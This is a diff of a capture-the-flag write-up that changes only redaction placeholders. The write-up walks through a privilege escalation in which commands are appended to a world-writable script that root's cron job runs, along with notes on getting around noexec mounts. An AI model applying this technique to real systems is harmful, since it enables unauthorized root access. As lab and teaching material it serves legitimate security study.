@@ -23,7 +23,7 @@ find . -iname "flag*" 2>/dev/null
 
 This quickly found the flag
 ```bash
-/<redacted>/<redacted>/data/flag-user.txt
+/redacted/redacted/data/flag-user.txt
 ```
 
 Then a trivial command to read the file and confirm it matched the Flag UUID format
@@ -49,7 +49,7 @@ Then reviewed the crontab file with `cat /usr/bin/crontab`
 
 ```bash
 # System maintenance tasks
-* * * * * root /bin/sh /<redacted>/<redacted>/scripts/xxxxxx_xxxxx.sh >> /var/log/maintenance/system_check.log 2>&1
+* * * * * root /bin/sh /redacted/redacted/scripts/xxxxxx_xxxxx.sh >> /var/redacted/redacted/xxxxxx_xxxxx.log 2>&1
 ```
 This confirmed the location and script that was run, and the location of where the output is sent.
 
@@ -63,7 +63,7 @@ This is the misconfiguration, as the script has full world `rwx` privilege.
 
 For a quick test I made sure I could actually write a command to the script file, and verify cron ran it successfully, and create a file in the `/tmp` folder.  **A quick note here**: `/var/log` had the `noexec` mount/directroy so I could not execute a command there if I needed to later in this process (i.e., to run a shell), as it turned out I didn't need it.
 ```bash
-$ echo 'id > /tmp/proof.txt' >> /<redacted>/<redacted>/scripts/xxxxxx_xxxxx.sh
+$ echo 'id > /tmp/proof.txt' >> /redacted/redacted/scripts/xxxxxx_xxxxx.sh
 ```
 After 60 seconds the file proof.txt appeared in the /tmp directory
 As it turns out the `/tmp` directory also had the `noexec` mount, so I couldn't send a executable command there.
@@ -77,16 +77,16 @@ $ grep -v noexec /proc/mounts
 ```
 Which showed a mount using the same as the directory that the script was located
 ```bash
-$ df /<redacted>/<redacted>/scripts/
+$ df /redacted/redacted/scripts/
 Filesystem           1K-blocks      Used Available Use% Mounted on
-<redacted>              21498384   2770576  17610420  14% /
+redacted              21498384   2770576  17610420  14% /
 ```
 
 My simple approach was to first see if I could enumerate the root directory and then the review to see if I could find the flag file
 
 Using the following command I was able to perform a Remote Code Execution (RCE)
 ```bash
-$ echo 'ls -la /root > /tmp/root_dir.txt; chmod 644 /tmp/root_dir.txt' >> /<redacted>/<redacted>/scripts/xxxxxx_xxxxx.sh
+$ echo 'ls -la /root > /tmp/root_dir.txt; chmod 644 /tmp/root_dir.txt' >> /redacted/redacted/scripts/xxxxxx_xxxxx.sh
 ```
 After the 60 seconds, this created a file in the `/tmp` directory of the target system root directory
 A simple command `cat` to read it and the flag file was visible
